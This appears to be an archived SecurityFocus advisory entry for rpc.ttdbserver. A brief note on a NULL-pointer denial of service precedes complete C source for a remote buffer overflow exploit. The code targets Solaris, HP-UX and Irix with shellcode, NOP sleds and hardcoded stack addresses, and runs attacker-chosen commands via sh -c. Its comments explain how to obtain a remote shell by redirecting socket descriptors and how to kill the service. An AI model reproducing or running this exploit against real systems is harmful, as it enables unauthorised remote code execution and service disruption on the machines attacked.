source: http://www.securityfocus.com/bid/811/info

It is possible to crash rpc.ttdbserver by using the old tddbserver buffer overflow exploit. This problem is caused by a NULL pointer being dereferenced when rpc function 15 is called with garbage. You cannot make rpc.ttdbserver execute arbitrary code with this vulnerability. The consequence of this vulnerability being exploited is a denial of service condition (rpc.ttdbserver).

/*
 rpc.ttdbserver remote overflow, apk
 Solaris (tested on SS5 and Ultra 2.5.1)
 Irix (tested on r5k and r10k O2 6.3), 
 HP-UX ( tested on 700s 10.20)

 usage: ./r [-ku] [-p port] [-f outfile] host cmd
           -k : kill ttdbserver (read below)
           -u : use UDP (default TCP)
           -p port : connect to ttdbserver at port (don't ask portmap)
           -f outfile : store rpc message in outfile (and do NOT contact host)

 note:
   it should compile on any normal system, to get HP-UX exploit compile with 
     -DHPUX, for Solaris -DSOLARIS, for Irix use -DIRIX
   cmd is run through sh -c, and there is no practical limit for command 
     length, but it has to fit in buffer (1024 bytes in this case), 
     and ~(strlen + 1) cannot contain '0'
   by default ttdbserver runs from inetd, so it will be respawned each time
     it die (I mean execute command), also because it dies correct reply is
     clnt_call error (connection reset, timeout etc)
   -f file option: On HP-UX and Irix, connected socket gets first free
     descriptor, 3 on HP-UX and 5 on Irix. You can use -f option to store
     datagram to file, and send it to ttdbserver with your telnet of 
     choice.  With command like "0<&3 1>&3 2>&3 exec sh" on HP-UX you'll get
     remote shell running. Solaris dup() connected fd to first free one
     over 256, so you have to study sh man page to find a way to do this <g>
     You should kill ttdbserver before, to make sure it doesn't have
     any files open except 0-2 fds passed from inetd. Actually on Irix
     it looks like fucked up, ttdbserver gets 0-2 fds from inetd, ignores
     them and opens new ones as 3 and 4 fd, so you need to redirect 5th fd.
     It happens on 6.3 at least, I need to look at other versions.
     Irix is also the only one I saw which supports ttdbserver over UDP,
     keep in mind that by default generated RPC datagram is TCP version with
     record marking, you should use -u option to get UDP version (or just remove
     first four bytes from generated file)
  for reasons I can't quite understand, you _have_ to kil ttdbserver on Solaris
    before sending a command there. When ttdbserver has connected clients,
    it simply returns an error (filename too long). In both cases
    it looks like the program goes through the same way, well, maybe I'll
    get a clue one day what happens there.
  On Irix to get over its fucked up cache, I simply send like 20kb to make
    it flushed, so it's not reliable. You can find a buffer allocated by xdr 
    and it should be better. 
  surprizingly there are some differences between ttdbserver on above platforms,
    like solaris dup() of fds, start-up Irix behaviour, the fact that
    on Irix it first tries chdir to directory then do some task (it's the
    reason I have to add "/f" at the end of buffer to have it copy overflow
    part of the buffer on stack) etc. That's why it may not work on other
    systems and versions than mentioned at the beginning.

 */

#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <rpc/rpc.h>

#define PORT 0
#define BSIZE 1024

#if defined(SOLARIS)
# define SP 0xefffd618
# define LENOFS 80
char asmcode[]="\x20\xbf\xff\xff\x20\xbf\xff\xff\x7f\xff\xff\xff\x92\x03\xe0\x48\x90\x02\x60\x10\xe0\x02\x3f\xf0\xa2\x80\x3f\xff\xa0\x24\x40\x10\xd0\x22\x3f\xf0\xc0\x22\x3f\xfc\xa2\x02\x20\x09\xc0\x2c\x7f\xff\xe2\x22\x3f\xf4\xa2\x04\x60\x03\xc0\x2c\x7f\xff\xe2\x22\x3f\xf8\xa2\x04\x40\x10\xc0\x2c\x7f\xff\x82\x10\x20\x0b\x91\xd0\x20\x08\xff\xff\xff\xfc\x22\x22\x22\x22\x33\x33\x33\x33\x44\x44\x44\x44\x2f\x62\x69\x6e\x2f\x6b\x73\x68\x2e\x2d\x63\x2e";
char NOP[]="\x80\x1c\x40\x11";
#endif

#if defined(HPUX)
# define SP 0x7b03cc10
# define LENOFS 84
char asmcode[]="\xeb\x40\x40\x02\x0b\x39\x02\x80\xd7\x40\x0c\x1e\xb7\x5a\x20\xb8\x0b\x5a\x02\x59\x0f\x21\x10\x98\x97\x18\x07\xff\x0f\x39\x12\x81\x0f\x20\x12\x99\xb7\x39\x20\x10\x0f\x20\x12\x1f\x0f\x59\x12\x89\xb7\x39\x20\x06\x0f\x20\x12\x1f\x0f\x59\x12\x91\x0b\x38\x06\x19\x0f\x20\x12\x1f\xb7\x59\x07\xe1\x20\x20\x08\x01\xe4\x20\xe0\x08\xb4\x16\x10\x16\x11\x11\x11\x11\x22\x22\x22\x22\x33\x33\x33\x33\x44\x44\x44\x44\x2f\x62\x69\x6e\x2f\x73\x68\x2e\x2d\x63\x2e";
char NOP[]="\x0b\x39\x02\x80";
#endif

#if defined(IRIX)
# define SP 0x7fff1b30
# define LENOFS 76
char asmcode[]="\x04\x10\xff\xff\x27\xe4\x01\x01\x24\x84\xff\x5e\x8c\x8c\xff\xe5\x24\x0d\xff\xff\x01\xac\x60\x23\x01\x84\x60\x20\xa1\x80\xff\xff\xa0\x80\xff\xff\xac\x84\xff\xed\x24\x84\xff\xfd\xa0\x80\xff\xff\xac\x84\xff\xec\x24\x84\xff\xf8\x24\x85\xff\xf0\xac\x84\xff\xf0\xac\x80\xff\xfc\x24\x02\x03\xf3\x02\x04\x8d\x0c\xff\xff\xff\xfc\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x2f\x62\x69\x6e\x2f\x73\x68\x2e\x2d\x63\x2e";
char NOP[]="\x24\x0f\x12\x34";

#endif

#define TT_DBSERVER_PROG 100083
#define TT_DBSERVER_VERS 1
#define _TT_P 7

struct tt_reply {
  int i1;
  int i2;
};

void usage(char *s) {
  printf("Usage: %s [-ku] [-p port] [-f outfile] host cmd\n", s);
  exit(0);
}

bool_t xdr_tt_reply(XDR *xdrs, struct tt_reply *objp) {

  if (!xdr_int(xdrs, &objp->i1))
    return (FALSE);
  if (!xdr_int(xdrs, &objp->i2)) 
    return (FALSE);
  return (TRUE);
}

void make_file(char *fname, char *buf, int type);

main(int argc, char *argv[]) {
  extern int optind;
  extern char *optarg;
  CLIENT *cl;
  enum clnt_stat stat;
  struct timeval tm;
  struct hostent *hp;
  struct sockaddr_in target;
  struct tt_reply op_res;
  char buf[64000], *path, *cmd, *host, *bp, *outfile = NULL;
  int sd, i, sp = SP, bsize = BSIZE, port = PORT, kill = 0, proto = 0;

  while ((i = getopt(argc, argv, "ukp:f:")) != EOF)
    switch (i) {
      case 'p':
        port = atoi(optarg);
        break;
      case 'k':
        kill = 1;
        break;
      case 'u':
        proto = 1;
        break;
      case 'f':
        outfile = optarg;
        break;
      default:
        usage(argv[0]);
    }
  if (argc - optind < 2)
    usage(argv[0]);
  cmd = argv[optind + 1];
  host = argv[optind];

  for (i = 0; i < sizeof(buf); i++)
    *(buf + i) = NOP[i % 4];

  i = bsize - strlen(asmcode) - strlen(cmd);
  i &= 0xfffffffc;
  strcpy(buf + i, asmcode);
  strcat(buf, cmd);
  *(int *)(buf + i + LENOFS) = ~(strlen(cmd) + 1);
  buf[strlen(buf)] = '.';
  bp = buf + bsize;
  for (i = 0; i < 16; bp+=4, i++)
    *(int *)bp = sp;
#ifdef IRIX
  sp = sp + 400 + 31652;
  for (i = 0; i < 5000; bp+=4, i++)
    *(int *)bp = sp;
  *bp++ = '/';
  *bp++ = 'f';
  path = buf + 2;
#else
  path = buf;
#endif
  *bp = 0;

  if (outfile) {
    make_file(outfile, buf, proto);
    printf("rpc datagram stored in %s\n", outfile);
    exit(0);
  }

  if ((target.sin_addr.s_addr = inet_addr(host)) == -1) {
    if ((hp = gethostbyname(host)) == NULL) {
      printf("%s: cannot resolve\n", host);
      exit(1); 
    } else
      target.sin_addr.s_addr = *(u_long *)hp->h_addr;
  }
  target.sin_family = AF_INET;
  target.sin_port = htons(port);
  sd = RPC_ANYSOCK;

  tm.tv_sec = 4;
  tm.tv_usec = 0;
  if (proto) 
    cl = clntudp_create(&target, TT_DBSERVER_PROG, TT_DBSERVER_VERS, tm, &sd);
  else
    cl = clnttcp_create(&target, TT_DBSERVER_PROG, TT_DBSERVER_VERS, &sd, 0, 0);
  if (cl == NULL) {
    clnt_pcreateerror("clnt_create");
    exit(0);
  }
  cl->cl_auth = authunix_create("localhost", 0, 0, 0, NULL);
  tm.tv_sec = 10;

  if (kill) {
    path = NULL;
    bp = NULL;
    if ((stat = clnt_call(cl, 15, xdr_wrapstring, (char *)&path, 
        xdr_wrapstring, (char *)&bp, tm)) != RPC_SUCCESS) {
      clnt_perror(cl, "clnt_call");
      exit(1);
    }
    printf("Could not kill ttdbserver, reply is: %s\n", bp);
    exit(1);
  }

  if ((stat = clnt_call(cl, _TT_P, xdr_wrapstring, (char *)&path, xdr_tt_reply, 
       (char *)&op_res, tm)) != RPC_SUCCESS) {
    clnt_perror(cl, "clnt_call");
    exit(1);
  }
  printf("res i1 %d, res i2 %d\n", op_res.i1, op_res.i2);
  clnt_destroy(cl);
}

void make_file(char *fname, char *buf, int type) {
  int fd, offs;
  XDR xdrm;
  struct rpc_msg rpc_hdr;
  struct authunix_parms aup;
  char dgram[64000], rauth[MAX_AUTH_BYTES];

  if (type == 1) /* UDP */
    offs = 4;
  if ((fd = open(fname, O_RDWR | O_CREAT | O_TRUNC, 0666)) == -1) {
    perror(fname);
    exit(1);
  }
  xdrmem_create(&xdrm, rauth, sizeof(rauth), XDR_ENCODE);
  aup.aup_time = (u_long)time(NULL);
  aup.aup_machname = "localhost";
  aup.aup_uid = 0;
  aup.aup_gid = 0;
  aup.aup_len = 0;
  aup.aup_gids = NULL;
  if (xdr_authunix_parms(&xdrm, &aup) == FALSE) {
    printf("error encoding auth cred\n");
    exit(1);
  }
  rpc_hdr.rm_call.cb_cred.oa_length = xdr_getpos(&xdrm);
  xdr_destroy(&xdrm);
  xdrmem_create(&xdrm, dgram + 4, sizeof(dgram), XDR_ENCODE);
  rpc_hdr.rm_xid = 0x12345678;
  rpc_hdr.rm_direction = CALL;
  rpc_hdr.rm_call.cb_rpcvers = 2;
  rpc_hdr.rm_call.cb_prog = TT_DBSERVER_PROG;
  rpc_hdr.rm_call.cb_vers = TT_DBSERVER_VERS;
  rpc_hdr.rm_call.cb_proc = _TT_P;
  rpc_hdr.rm_call.cb_cred.oa_flavor = AUTH_UNIX;
  rpc_hdr.rm_call.cb_cred.oa_base = rauth;
  rpc_hdr.rm_call.cb_verf.oa_flavor = AUTH_NONE;
  rpc_hdr.rm_call.cb_verf.oa_base = NULL;
  rpc_hdr.rm_call.cb_verf.oa_length = 0;
  if (xdr_callmsg(&xdrm, &rpc_hdr) == FALSE) {
    printf("error encoding rpc header\n");
    exit(1);
  }
  if (xdr_wrapstring(&xdrm, &buf) == FALSE) {
    printf("error encoding rpc data\n");
    exit(1);
  }
  /* record marking */
  *(u_int *)dgram = 0x80000000 | xdr_getpos(&xdrm);
  if (write(fd, dgram + offs, xdr_getpos(&xdrm) + 4) == -1) {
    perror("write");
    exit(1);
  }
  xdr_destroy(&xdrm);
  close(fd);
}

